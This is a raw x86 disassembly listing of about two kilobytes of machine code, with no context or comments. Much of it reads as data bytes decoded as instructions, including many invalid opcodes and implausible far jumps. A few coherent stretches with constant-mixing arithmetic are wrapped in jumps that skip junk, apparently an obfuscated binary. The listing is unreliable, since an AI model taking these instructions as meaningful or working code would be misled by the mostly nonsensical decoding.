  412a18:	ins    BYTE PTR es:[edi],dx
  412a19:	shr    BYTE PTR [esi],1
  412a1b:	fs sub ecx,esp
  412a1e:	jl     0x412a02
  412a20:	cmp    al,0xb5
  412a22:	push   ebp
  412a23:	test   eax,0xebcbb6b2
  412a28:	push   esi
  412a29:	ror    DWORD PTR [ebp+0x5398d696],0x3c
  412a30:	loopne 0x412a64
  412a32:	clc    
  412a33:	pop    edi
  412a34:	inc    esp
  412a35:	in     eax,dx
  412a36:	adc    BYTE PTR ds:[ebx],ah
  412a39:	(bad)  
  412a3a:	fwait
  412a3b:	adc    BYTE PTR [edx+0x473ad6e5],bh
  412a41:	push   eax
  412a42:	fsub   QWORD PTR [ecx]
  412a44:	rcl    dl,cl
  412a46:	push   ss
  412a47:	mov    ecx,0xa12d9d78
  412a4c:	xchg   ebp,eax
  412a4d:	cmp    BYTE PTR [edi],cl
  412a4f:	jl     0x412aad
  412a51:	daa    
  412a52:	sbb    ch,BYTE PTR [edi]
  412a54:	(bad)  
  412a55:	sete   ah
  412a58:	and    eax,0x42c813c0
  412a5d:	jbe    0x412aa8
  412a5f:	ss mov eax,0x41989832
  412a65:	mov    bh,0xbe
  412a67:	adc    bh,0x7d
  412a6a:	mov    DWORD PTR [edi-0x31],ebp
  412a6d:	mov    bh,0x28
  412a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a70:	push   esp
  412a71:	jnp    0x412a22
  412a73:	scas   al,BYTE PTR es:[edi]
  412a74:	(bad)  
  412a75:	and    al,cl
  412a77:	clc    
  412a78:	adc    BYTE PTR [edi+edi*2-0x2e],0xcc
  412a7d:	jle    0x412a57
  412a7f:	xor    ebp,DWORD PTR [edx]
  412a81:	imul   ebp,DWORD PTR [esp+edx*4+0x70],0x65a80d5f
  412a89:	push   cs
  412a8a:	adc    dl,BYTE PTR [eax+edi*8+0x5b]
  412a8e:	cs push ebp
  412a90:	cmp    DWORD PTR [ebx],edx
  412a92:	dec    esi
  412a93:	adc    edx,edi
  412a95:	cdq    
  412a96:	pushf  
  412a97:	inc    ebx
  412a98:	cs fwait
  412a9a:	or     eax,0xcad02afc
  412a9f:	ds jo  0x412a51
  412aa2:	jb     0x412a3a
  412aa4:	cmp    al,0xb0
  412aa6:	repz shr DWORD PTR [edi-0x47],1
  412aaa:	sbb    eax,0xee858064
  412aaf:	lods   eax,DWORD PTR ds:[esi]
  412ab0:	pop    es
  412ab1:	test   dl,cl
  412ab3:	sbb    DWORD PTR [edi+0x7bb65d92],0xfffffff3
  412aba:	sub    eax,0x9447d66c
  412abf:	(bad)  
  412ac0:	jo     0x412a5d
  412ac2:	sahf   
  412ac3:	fcomp  QWORD PTR [esi+eiz*4-0x2a83ffb7]
  412aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412acb:	and    cl,al
  412acd:	and    al,BYTE PTR [eax-0x4759ab17]
  412ad3:	xor    eax,0xe6753834
  412ad8:	sbb    BYTE PTR [edi],0x1e
  412adb:	mov    dl,cl
  412add:	jnp    0x412b33
  412adf:	push   ebp
  412ae0:	sbb    cl,cl
  412ae2:	jo     0x412b1e
  412ae4:	test   eax,0x3c22cda6
  412ae9:	mov    ds:0x8d2248b6,eax
  412aee:	push   esp
  412aef:	cmp    dh,BYTE PTR [edx]
  412af1:	dec    edx
  412af2:	mov    BYTE PTR [ebp+0x68],ch
  412af5:	adc    edi,DWORD PTR [esi]
  412af7:	cs jmp 0x99d073e3
  412afd:	pop    ebx
  412afe:	sub    DWORD PTR [edx-0x36c9a6aa],esi
  412b04:	(bad)  
  412b05:	dec    ebp
  412b06:	mov    dl,0x81
  412b08:	jge    0x412b77
  412b0a:	cmp    eax,0x702d08f7
  412b0f:	imul   esi,ebx,0xfaf987b3
  412b15:	xor    BYTE PTR [ebp-0x33],al
  412b18:	mov    dl,0x82
  412b1a:	xor    al,BYTE PTR [eax+0x16]
  412b1d:	push   eax
  412b1e:	mov    ebp,0x20346cbd
  412b23:	iret   
  412b24:	test   al,0xb9
  412b26:	outs   dx,BYTE PTR ds:[esi]
  412b27:	mov    ah,0x2
  412b29:	out    0x53,al
  412b2b:	int    0x27
  412b2d:	aam    0x9d
  412b2f:	add    BYTE PTR [edi],ch
  412b31:	stos   BYTE PTR es:[edi],al
  412b32:	ja     0x412b70
  412b34:	jmp    0xe368:0xf1316c44
  412b3b:	shl    DWORD PTR [ebx],0x5
  412b3e:	push   esi
  412b3f:	jnp    0x412b70
  412b41:	push   ebx
  412b42:	mov    ecx,0x8519a827
  412b47:	lea    ebx,ds:0xa866e480
  412b4d:	sub    edi,edx
  412b4f:	lahf   
  412b50:	test   al,0xd2
  412b52:	clc    
  412b53:	fucom  st(7)
  412b55:	in     al,dx
  412b56:	jg     0x412afa
  412b58:	sar    edi,1
  412b5a:	mov    DWORD PTR [ecx],esp
  412b5c:	jnp    0x412b3a
  412b5e:	xchg   esi,eax
  412b5f:	in     eax,0xa8
  412b61:	xor    dl,BYTE PTR [esi+eiz*8+0x33c09e12]
  412b68:	movq   QWORD PTR [eax+0x5d],mm7
  412b6c:	and    edx,edi
  412b6e:	(bad)  
  412b6f:	jnp    0x412be3
  412b71:	repz ss enter 0x7654,0x6
  412b77:	ror    ah,cl
  412b79:	aas    
  412b7a:	sub    esi,ebp
  412b7c:	xor    eax,0xa0c50113
  412b81:	add    DWORD PTR [edi+0x16a794c6],ebp
  412b87:	or     esp,ecx
  412b89:	mov    esi,DWORD PTR [edx+0x8508bf6]
  412b8f:	push   ebx
  412b90:	lock imul ecx,DWORD PTR [ecx-0x1194ff16],0x701742ee
  412b9b:	xchg   edx,eax
  412b9c:	cwde   
  412b9d:	fimul  WORD PTR [ebx+0x64]
  412ba0:	or     BYTE PTR [ebp-0x240ec474],dh
  412ba6:	mov    al,0x57
  412ba8:	fs je  0x412b4d
  412bab:	sbb    dl,ah
  412bad:	adc    al,0x1b
  412baf:	push   esp
  412bb0:	jo     0x412bae
  412bb2:	adc    eax,0x9fd922ee
  412bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bb8:	test   BYTE PTR [edx+0x4c7076d1],dl
  412bbe:	pop    es
  412bbf:	mov    eax,0x13cc6575
  412bc4:	ds out 0xe8,eax
  412bc7:	dec    ebx
  412bc8:	sbb    eax,0x398f5c88
  412bcd:	and    BYTE PTR [edi+0x6f],0x5e
  412bd1:	jae    0x412b79
  412bd3:	aas    
  412bd4:	out    dx,al
  412bd5:	sbb    al,dl
  412bd7:	jno    0x412b90
  412bd9:	cmp    eax,0xeaaed526
  412bde:	xchg   ebx,eax
  412bdf:	xchg   ebx,eax
  412be0:	dec    ecx
  412be1:	call   0x9f2b1b26
  412be6:	xchg   ebp,eax
  412be7:	shr    ebp,0x8e
  412bea:	pushf  
  412beb:	pop    edi
  412bec:	stc    
  412bed:	pop    es
  412bee:	mov    dh,0x80
  412bf0:	push   esp
  412bf1:	add    ebx,ebx
  412bf3:	add    DWORD PTR [ecx+0x52],ecx
  412bf6:	xchg   edi,eax
  412bf7:	jns    0x412c3b
  412bf9:	cmovs  esp,DWORD PTR [ecx+0x3e01b3ee]
  412c00:	mov    cl,0xac
  412c02:	inc    edx
  412c03:	sbb    DWORD PTR [edx],0x221eecb6
  412c09:	stos   BYTE PTR es:[edi],al
  412c0a:	sbb    eax,0x67fa19db
  412c0f:	(bad)  
  412c10:	push   edi
  412c11:	loopne 0x412c49
  412c13:	mov    ecx,0x65f53cbc
  412c18:	inc    BYTE PTR gs:[edi+0x63]
  412c1c:	iret   
  412c1d:	cmc    
  412c1e:	imul   eax,DWORD PTR [eax+ecx*8-0x1d],0xffffffc6
  412c23:	cdq    
  412c24:	sbb    al,ch
  412c26:	loope  0x412bec
  412c28:	imul   BYTE PTR [ebx-0x604b668d]
  412c2e:	leave  
  412c2f:	ins    BYTE PTR es:[edi],dx
  412c30:	je     0x412c8f
  412c32:	push   eax
  412c33:	je     0x412c93
  412c35:	ins    DWORD PTR es:[edi],dx
  412c36:	cmp    cl,BYTE PTR [ebx+0x2b]
  412c39:	pop    edx
  412c3a:	jb     0x412cb9
  412c3c:	ret    
  412c3d:	mov    eax,0xf148dfdf
  412c42:	inc    edi
  412c43:	xchg   edi,eax
  412c44:	mov    eax,ds:0x8b4d4f9b
  412c49:	inc    eax
  412c4a:	xchg   edi,eax
  412c4b:	lock in eax,dx
  412c4d:	and    eax,0xb00bf8d4
  412c52:	(bad)  
  412c53:	hlt    
  412c54:	mov    esp,0x2ee350b3
  412c59:	mov    esi,0x5b39f618
  412c5e:	dec    eax
  412c5f:	mov    edi,0x56c9c7e6
  412c64:	not    cl
  412c66:	mov    ah,BYTE PTR [esi+0x1562616e]
  412c6c:	leave  
  412c6d:	mov    eax,DWORD PTR [ebp-0x8]
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0x7cb5f0b7
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [edi+0x7c],al
  412caf:	jl     0x412c91
  412cb1:	xchg   ecx,eax
  412cb2:	in     al,0xc8
  412cb4:	scas   eax,DWORD PTR es:[edi]
  412cb5:	test   ch,bl
  412cb7:	inc    ecx
  412cb8:	jnp    0x412cfc
  412cba:	cli    
  412cbb:	mov    BYTE PTR [edx-0x6faf3be4],bh
  412cc1:	sbb    eax,edi
  412cc3:	fstp   DWORD PTR [esi]
  412cc5:	sti    
  412cc6:	sub    ch,cl
  412cc8:	hlt    
  412cc9:	in     eax,0xd6
  412ccb:	push   eax
  412ccc:	mov    edx,0xc81b76e5
  412cd1:	mov    ds:0x1eaeb84a,eax
  412cd6:	jle    0x412cfb
  412cd8:	cld    
  412cd9:	mov    esi,0xbc9cc26d
  412cde:	or     bh,ah
  412ce0:	pop    edx
  412ce1:	pop    edi
  412ce2:	mov    eax,0x313140d9
  412ce7:	std    
  412ce8:	(bad)  
  412ce9:	mov    edi,0x52c0b305
  412cee:	lock pop eax
  412cf0:	push   ebx
  412cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cf2:	lock fild WORD PTR [ebx-0x56]
  412cf6:	ins    DWORD PTR es:[edi],dx
  412cf7:	lahf   
  412cf8:	lahf   
  412cf9:	and    dl,BYTE PTR [ecx]
  412cfb:	jmp    0x3da897bf
  412d00:	cmp    dh,ch
  412d02:	push   ss
  412d03:	pop    ss
  412d04:	and    al,0x27
  412d06:	inc    esi
  412d07:	cdq    
  412d08:	retf   
  412d09:	sbb    BYTE PTR [eax],0x14
  412d0c:	inc    esi
  412d0d:	inc    esp
  412d0e:	inc    eax
  412d0f:	imul   DWORD PTR [ecx+0x38dc2806]
  412d15:	sar    esi,cl
  412d17:	in     eax,dx
  412d18:	(bad)  
  412d1c:	pop    ecx
  412d1d:	and    BYTE PTR [ecx-0x48],bl
  412d20:	dec    esp
  412d21:	sbb    eax,0x58dc9191
  412d26:	push   ebp
  412d27:	lds    edx,FWORD PTR [eax+0x7d083e89]
  412d2d:	loope  0x412d8b
  412d2f:	mov    cs:0x1e9f768e,al
  412d35:	stos   BYTE PTR es:[edi],al
  412d36:	mov    bl,0x8b
  412d38:	aas    
  412d39:	call   0x170f43dd
  412d3e:	(bad)  
  412d3f:	mul    ch
  412d41:	push   0xf13f3e29
  412d46:	adc    DWORD PTR [ecx+esi*2+0x6a],esp
  412d4a:	inc    edx
  412d4b:	jns    0x412d4a
  412d4d:	dec    eax
  412d4e:	int    0x6e
  412d50:	ins    DWORD PTR es:[edi],dx
  412d51:	xchg   esp,eax
  412d52:	cmp    al,0xa0
  412d54:	push   0x11
  412d56:	call   0xffd1:0x247eac74
  412d5d:	out    0x6f,eax
  412d5f:	pop    esp
  412d60:	popf   
  412d61:	push   cs
  412d62:	add    esp,esi
  412d64:	pop    ebp
  412d65:	(bad)  [edx-0x53]
  412d68:	and    al,0x59
  412d6a:	cmp    bl,BYTE PTR [esi-0x17]
  412d6d:	dec    ecx
  412d6e:	jl     0x412dc8
  412d70:	nop
  412d71:	ins    DWORD PTR es:[edi],dx
  412d72:	rcl    eax,1
  412d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d75:	mov    ds:0x799573e8,al
  412d7a:	or     eax,DWORD PTR [esi+0x20]
  412d7d:	out    0x5f,eax
  412d7f:	pop    ss
  412d80:	aas    
  412d81:	in     al,0xcc
  412d83:	inc    edi
  412d84:	sub    eax,0x9b1fea9c
  412d89:	lds    ebp,FWORD PTR [edi+0x4c]
  412d8c:	out    dx,eax
  412d8d:	adc    ch,dl
  412d8f:	sbb    dh,bl
  412d91:	xchg   DWORD PTR [edx-0x7f],eax
  412d94:	push   edi
  412d95:	(bad)  
  412d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d97:	in     al,dx
  412d98:	retf   0x7940
  412d9b:	js     0x412dc1
  412d9d:	mov    ebp,0xa47eb0bb
  412da2:	push   ds
  412da3:	cwde   
  412da4:	or     al,0xf1
  412da6:	dec    edi
  412da7:	je     0x412e22
  412da9:	test   eax,0x2861d111
  412dae:	lods   al,BYTE PTR ds:[esi]
  412daf:	xor    bl,BYTE PTR [ebp+0x6bcca537]
  412db5:	xchg   ecx,eax
  412db6:	sub    al,BYTE PTR [ecx+ebp*4+0x45]
  412dba:	sahf   
  412dbb:	add    bl,BYTE PTR [eax-0x7cff0d44]
  412dc1:	add    cl,BYTE PTR [ecx+0x24c30962]
  412dc7:	not    DWORD PTR [edi]
  412dc9:	adc    eax,0x1a002278
  412dce:	aad    0x39
  412dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dd1:	or     eax,0x1518685
  412dd6:	mov    DWORD PTR ss:[eax],ebp
  412dd9:	add    BYTE PTR [edi],dl
  412ddb:	out    0x49,eax
  412ddd:	sub    eax,0x28f695e
  412de2:	jl     0x412d6d
  412de4:	repz cmp bl,BYTE PTR [ebp+ebx*2+0x2f317fbe]
  412dec:	(bad)  
  412ded:	daa    
  412dee:	pop    ebx
  412def:	sbb    al,0x72
  412df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412df2:	fdivr  DWORD PTR [edx]
  412df4:	pushf  
  412df5:	pop    edx
  412df6:	mov    ebx,DWORD PTR [ebp-0x5]
  412df9:	das    
  412dfa:	mov    ebx,0xaf6d84ec
  412dff:	cwde   
  412e00:	sti    
  412e01:	loopne 0x412da2
  412e03:	mov    ebp,0x53300e7c
  412e08:	adc    BYTE PTR [esi],dl
  412e0a:	mov    al,ds:0x3f1c1c0c
  412e0f:	gs mov ebx,0xbf4d6887
  412e15:	cmp    ax,dx
  412e18:	(bad)  [eax]
  412e1a:	clc    
  412e1b:	xchg   DWORD PTR [eax],edx
  412e1d:	mov    bl,bh
  412e1f:	xchg   DWORD PTR [edi-0x7a497cf],ecx
  412e25:	stos   DWORD PTR es:[edi],eax
  412e26:	and    BYTE PTR [edi],0xaa
  412e29:	fidiv  WORD PTR [esi]
  412e2b:	retf   0x9267
  412e2e:	enter  0x6b66,0x66
  412e32:	mov    esi,0x2bf9ca8
  412e37:	aas    
  412e38:	sub    al,ch
  412e3a:	jmp    0x8cf5:0xf7aa0156
  412e41:	mov    ebx,DWORD PTR [ecx+ecx*8]
  412e44:	push   edi
  412e45:	aas    
  412e46:	adc    eax,0x697a57d0
  412e4b:	mov    dl,0x2a
  412e4d:	adc    al,0xf1
  412e4f:	mov    dh,0x92
  412e51:	imul   DWORD PTR [eax-0x7b65320e]
  412e57:	pop    ds
  412e58:	shr    DWORD PTR [esi-0x49],1
  412e5b:	hlt    
  412e5c:	idiv   BYTE PTR [ebp-0x2f]
  412e5f:	cmp    DWORD PTR [edi],0xffffffb3
  412e62:	stos   DWORD PTR es:[edi],eax
  412e63:	jmp    0x412e44
  412e65:	pusha  
  412e66:	mov    edi,0x6139132c
  412e6b:	xchg   edi,eax
  412e6c:	dec    edi
  412e6d:	fadd   DWORD PTR gs:[edx-0x74]
  412e71:	je     0x412e90
  412e73:	jnp    0x412e25
  412e75:	xchg   ebx,eax
  412e76:	dec    edi
  412e77:	fistp  DWORD PTR [edi-0x30fe17ac]
  412e7d:	bound  esi,QWORD PTR [ebp-0x7a]
  412e80:	jmp    0xcff4:0x1b45e53e
  412e87:	jae    0x412e49
  412e89:	xchg   esp,eax
  412e8a:	mov    BYTE PTR [eax-0x13],ah
  412e8d:	sub    al,0xd
  412e8f:	mov    cl,0x44
  412e91:	in     eax,0xc5
  412e93:	inc    edx
  412e94:	fimul  WORD PTR [esi]
  412e96:	cmp    al,0xcd
  412e98:	test   BYTE PTR [eax+ebx*8+0x1],bl
  412e9c:	push   0xe7db36f7
  412ea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea2:	sbb    al,0xfc
  412ea4:	out    0xcc,eax
  412ea6:	outs   dx,BYTE PTR ds:[esi]
  412ea7:	mov    esi,0xf1cf01aa
  412eac:	in     eax,0xbf
  412eae:	jle    0x412e84
  412eb0:	xchg   esp,ecx
  412eb2:	push   ss
  412eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb4:	inc    ebx
  412eb5:	icebp  
  412eb6:	adc    bl,BYTE PTR [edi*8+0xa6ab1cd]
  412ebd:	call   0xb59850af
  412ec2:	mov    ecx,0xcbd1215c
  412ec7:	enter  0x54af,0xc3
  412ecb:	xchg   esi,eax
  412ecc:	jecxz  0x412ef0
  412ece:	aas    
  412ecf:	sub    BYTE PTR [ecx],bh
  412ed1:	adc    al,0x9a
  412ed3:	push   edi
  412ed4:	mov    edi,0xcd4b9927
  412ed9:	sar    ch,cl
  412edb:	cmp    al,0x2d
  412edd:	inc    eax
  412ede:	aad    0x8b
  412ee0:	push   esp
  412ee1:	or     BYTE PTR [edi],dl
  412ee3:	xchg   edi,eax
  412ee4:	jmp    0x412f1c
  412ee6:	aaa    
  412ee7:	(bad)  
  412ee8:	das    
  412ee9:	jp     0x412ee9
  412eeb:	int    0xad
  412eed:	test   al,0xe
  412eef:	fidiv  DWORD PTR [ebp-0x314560f6]
  412ef5:	dec    esp
  412ef6:	popa   
  412ef7:	arpl   WORD PTR [esi+0x23],dx
  412efa:	ins    BYTE PTR es:[edi],dx
  412efb:	push   es
  412efc:	call   0xe8f1e1b0
  412f01:	ins    DWORD PTR es:[edi],dx
  412f02:	cs dec edx
  412f04:	in     eax,0xe3
  412f06:	cli    
  412f07:	mov    al,ds:0x4b7536c8
  412f0c:	jle    0x412ebd
  412f0e:	cmc    
  412f0f:	scas   al,BYTE PTR es:[edi]
  412f10:	out    0xd0,al
  412f12:	addr16 pop esi
  412f14:	pop    ss
  412f15:	rol    ah,0xf9
  412f18:	push   ebx
  412f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f1a:	jle    0x412ee1
  412f1c:	mov    bh,0xb3
  412f1e:	and    BYTE PTR [edx-0x204a7b9c],cl
  412f24:	pop    ss
  412f25:	test   edx,0x25a44fdd
  412f2b:	(bad)  
  412f2c:	out    dx,eax
  412f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f2e:	fwait
  412f2f:	xor    al,0x5c
  412f31:	loope  0x412f68
  412f33:	cld    
  412f34:	iret   
  412f35:	out    0xe9,al
  412f37:	push   ss
  412f38:	and    BYTE PTR [ebx+0x5f],0xcd
  412f3c:	(bad)  [edx-0x613a1bd5]
  412f42:	xor    al,0xb1
  412f44:	add    edx,0x409ac7c5
  412f4a:	and    al,0x3a
  412f4c:	outs   dx,BYTE PTR ds:[esi]
  412f4d:	rcl    BYTE PTR [esi],1
  412f4f:	inc    esi
  412f50:	inc    ebx
  412f51:	add    al,bl
  412f53:	pop    ebx
  412f54:	cld    
  412f55:	mov    DWORD PTR [edx-0x358a902e],0xbdccf4b5
  412f5f:	or     DWORD PTR [ebp-0x46],0x74
  412f63:	mov    ds:0x52781aef,al
  412f68:	sbb    BYTE PTR [esi+edx*2],bl
  412f6b:	mov    esi,0xf5db9849
  412f70:	stc    
  412f71:	xchg   esi,eax
  412f72:	add    ebx,DWORD PTR [edi+0x6bca809]
  412f78:	jp     0x412f03
  412f7a:	push   gs
  412f7c:	sub    eax,0x1449aaaf
  412f81:	fist   DWORD PTR [esi-0x261c73e1]
  412f87:	jmp    0x6dbc:0x4932c5d9
  412f8e:	dec    edx
  412f8f:	push   esp
  412f90:	rcr    BYTE PTR [ebx-0x6be99897],1
  412f96:	sub    cl,BYTE PTR [ecx-0x36]
  412f99:	push   cs
  412f9a:	sar    ah,cl
  412f9c:	xor    al,BYTE PTR ds:0x4d14938
  412fa2:	fbstp  TBYTE PTR [esi-0x4f38af67]
  412fa8:	enter  0x134c,0x31
  412fac:	or     ecx,DWORD PTR [eax+0x64]
  412faf:	(bad)  
  412fb0:	fbstp  TBYTE PTR [ebx+0x58]
  412fb3:	or     DWORD PTR [edx-0x3b61d3],esp
  412fb9:	lods   eax,DWORD PTR ds:[esi]
  412fba:	pop    edx
  412fbb:	dec    esp
  412fbc:	cmp    DWORD PTR [edx],ecx
  412fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fbf:	pop    esi
  412fc0:	or     BYTE PTR [ecx-0x79],dh
  412fc3:	pop    edx
  412fc4:	cmp    dh,BYTE PTR [esp+edx*4]
  412fc7:	dec    BYTE PTR [edi-0x6482ef7c]
  412fcd:	rcr    BYTE PTR [ebp+0x7ca0e188],1
  412fd3:	or     BYTE PTR [esi],dl
  412fd5:	cmp    DWORD PTR [ebx+0x6],ecx
  412fd8:	lock xor ah,BYTE PTR [bx+si-0x22]
  412fdd:	push   edx
  412fde:	cdq    
  412fdf:	and    dh,BYTE PTR [edi]
  412fe1:	std    
  412fe2:	cs in  eax,dx
  412fe4:	mov    WORD PTR [eax],es
  412fe6:	rol    DWORD PTR [edi+0xd],0xc4
  412fea:	push   esi
  412feb:	inc    esi
  412fec:	inc    ecx
  412fed:	stc    
  412fee:	mov    ecx,0xde6a8b53
  412ff3:	dec    ebx
  412ff4:	xor    BYTE PTR [ebx-0x6],ah
  412ff7:	pop    ds
  412ff8:	pop    es
  412ff9:	mov    edi,0x301801c8
  412ffe:	stos   BYTE PTR es:[edi],al
  412fff:	in     al,0x1e
  413001:	test   DWORD PTR [ecx+0xc],eax
  413004:	adc    BYTE PTR [ebp-0x2714726e],0xe7
  41300b:	mov    esi,0x2be6d388
  413010:	rol    BYTE PTR [edx],0x7b
  413013:	mov    dl,0x57
  413015:	adc    dl,cl
  413017:	dec    ecx
  413018:	mov    edi,0x99f1e091
  41301d:	rol    BYTE PTR [edx],cl
  41301f:	test   al,0x1e
  413021:	push   eax
  413022:	cmp    DWORD PTR [eax+esi*8+0x45fc947a],ecx
  413029:	push   ds
  41302a:	and    bh,BYTE PTR [ebx]
  41302c:	mov    ecx,0x34fb01
  413031:	cli    
  413032:	in     eax,0x8a
  413034:	sub    dl,ch
  413036:	mov    esi,0xbf4ba91a
  41303b:	repz xchg esi,eax
  41303d:	inc    eax
  41303e:	xor    edx,esp
  413040:	ins    DWORD PTR es:[edi],dx
  413041:	xchg   ebp,eax
  413042:	pop    ecx
  413043:	enter  0x6286,0xe7
  413047:	mov    edi,DWORD PTR [ecx-0x3bf0c4ad]
  41304d:	test   cl,cl
  41304f:	popf   
  413050:	jle    0x4130ae
  413052:	lds    ebp,FWORD PTR [esi]
  413054:	retf   0x6592
  413057:	mov    eax,0xc976051a
  41305c:	inc    ebp
  41305d:	mov    esp,0x5ca2a626
  413062:	push   ds
  413063:	or     eax,0x476db4f9
  413068:	push   ecx
  413069:	push   eax
  41306a:	call   0x422046
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [esi+ebp*8+0x77],edi
  4130e0:	loope  0x413160
  4130e2:	ror    DWORD PTR [eax+0x18],cl
  4130e5:	sbb    BYTE PTR [edx+0x26181812],ch
  4130eb:	fs sub edi,ecx
  4130ee:	imul   esi
  4130f0:	xchg   edi,eax
  4130f1:	ret    0x208f
  4130f4:	cmp    esp,ebp
  4130f6:	jae    0x4130cf
  4130f8:	ins    BYTE PTR es:[edi],dx
  4130f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130fa:	inc    esi
  4130fb:	mov    ecx,0x9e35ebcc
  413100:	(bad)  
  413101:	sahf   
  413102:	stc    
  413103:	mov    esp,0x51c996d3
  413108:	inc    ebx
  413109:	retf   
  41310a:	cmc    
  41310b:	xor    ebx,DWORD PTR [ebp+0x2b65c7a7]
  413111:	enter  0xa03,0xa7
  413115:	aad    0x1c
  413117:	shl    BYTE PTR [ecx-0x19],1
  41311a:	or     dh,BYTE PTR [ecx-0x35c1e5ea]
  413120:	cmp    BYTE PTR cs:[ebp+0x22],dh
  413124:	lea    eax,ss:[eax+0x385ac05a]
  41312b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41312d:	imul   sp,WORD PTR [edx],0x64
  413131:	xchg   ebp,eax
  413132:	stos   BYTE PTR es:[edi],al
  413133:	(bad)  
  413134:	push   eax
  413135:	les    eax,FWORD PTR [edx-0x576f2e00]
  41313b:	out    dx,eax
  41313c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41313d:	ret    
  41313e:	cld    
  41313f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413140:	(bad)  
  413142:	arpl   WORD PTR [ebp+0x1e],sp
  413145:	pusha  
  413146:	jl     0x413113
  413148:	cmp    DWORD PTR [ebx],esp
  41314a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41314b:	repz jmp 0x413104
  41314e:	add    BYTE PTR [ecx-0x6e],bl
  413151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413152:	in     eax,0xa2
  413154:	jne    0x413149
  413156:	clc    
  413157:	ds and al,ch
  41315a:	fisttp DWORD PTR [eax+0x7bff796c]
  413160:	scas   al,BYTE PTR es:[edi]
  413161:	mov    ah,0xb5
  413163:	adc    bl,BYTE PTR [eax]
  413165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413166:	int3   
  413167:	das    
  413168:	mov    edi,esi
  41316a:	jl     0x413110
  41316c:	(bad)  
  41316d:	in     eax,0xe8
  41316f:	inc    esp
  413170:	inc    edi
  413171:	sbb    BYTE PTR [ebx],ch
  413173:	fs push 0x8627f500
  413179:	daa    
  41317a:	xor    eax,0x5cd1a0e7
  41317f:	int    0xb9
  413181:	scas   eax,DWORD PTR es:[edi]
  413182:	retf   0x74b6
  413185:	hlt    
  413186:	call   0xa098912d
  41318b:	push   es
  41318c:	sub    DWORD PTR [edi+ebx*4-0x2341898b],edi
  413193:	pop    ebp
  413194:	iret   
  413195:	and    al,0x18
  413197:	or     eax,0x86b41a8a
  41319c:	mov    ebp,0x424b069d
  4131a1:	jo     0x4131dc
  4131a3:	sub    eax,0xdc35e705
  4131a8:	shr    dl,1
  4131aa:	mov    ecx,0x81d91a90
  4131af:	mov    DWORD PTR [ecx],ebp
  4131b1:	sub    al,dh
  4131b3:	pop    ss
  4131b4:	std    
  4131b5:	test   BYTE PTR [ecx+ecx*1-0x5aeaa530],dh
  4131bc:	into   
  4131bd:	scas   al,BYTE PTR es:[edi]
  4131be:	xor    bh,bl
  4131c0:	jbe    0x4131b0
  4131c2:	cmp    BYTE PTR [edi+ecx*2+0xf5b724a],0xb6
  4131ca:	and    eax,0x520a54a3
  4131cf:	and    DWORD PTR [edi-0xce2323b],ebp
  4131d5:	mov    BYTE PTR [eax+0x23e2cb2a],al
  4131db:	es push cs
  4131dd:	je     0x4131ab
  4131df:	(bad)  
